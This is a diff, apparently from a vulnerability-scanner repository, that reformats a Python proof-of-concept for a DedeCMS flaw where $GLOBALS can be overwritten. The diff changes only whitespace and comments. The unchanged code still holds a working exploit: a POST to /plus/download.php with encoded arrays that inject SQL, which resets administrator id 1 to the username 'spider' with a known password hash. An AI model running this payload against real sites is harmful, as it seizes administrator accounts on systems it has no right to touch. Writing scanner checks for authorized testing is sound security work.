@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DedeCMS_0032' # 平台漏洞编号，留空
+    vuln_id = 'DedeCMS_0032'  # 平台漏洞编号，留空
     name = 'DedeCMS 修改任意管理员'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2013-06-07'  # 漏洞公布时间
     desc = '''
         DedeCMS include/dedesql.class.php 中全局变量$GLOBALS可以被任意修改。
@@ -26,6 +27,7 @@ class Vuln(ABVuln):
     product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
     product_version = '20130425'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '8fb81a42-443e-41ad-aaa2-09a06ec9116b'
     author = '47bwy'  # POC编写者
@@ -38,8 +40,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #查看软件版本
+
+            # 查看软件版本
             payload = '/data/admin/ver.txt'
             url = self.target + payload
             r = requests.get(url)
@@ -55,8 +57,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #//登录用户spider密码admin 
+
+            # //登录用户spider密码admin
             payload = "/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=97&arrs2[]=100&arrs2[]=109&arrs2[]=105&arrs2[]=110&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=117&arrs2[]=115&arrs2[]=101&arrs2[]=114&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=115&arrs2[]=112&arrs2[]=105&arrs2[]=100&arrs2[]=101&arrs2[]=114&arrs2[]=39&arrs2[]=44&arrs2[]=32&arrs2[]=96&arrs2[]=112&arrs2[]=119&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=102&arrs2[]=50&arrs2[]=57&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=97&arrs2[]=55&arrs2[]=52&arrs2[]=51&arrs2[]=56&arrs2[]=57&arrs2[]=52&arrs2[]=97&arrs2[]=48&arrs2[]=101&arrs2[]=52&arrs2[]=39&arrs2[]=32&arrs2[]=119&arrs2[]=104&arrs2[]=101&arrs2[]=114&arrs2[]=101&arrs2[]=32&arrs2[]=105&arrs2[]=100&arrs2[]=61&arrs2[]=49&arrs2[]=32&arrs2[]=35"
             url = self.target + payload
             r = requests.post(url)
@@ -67,6 +69,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
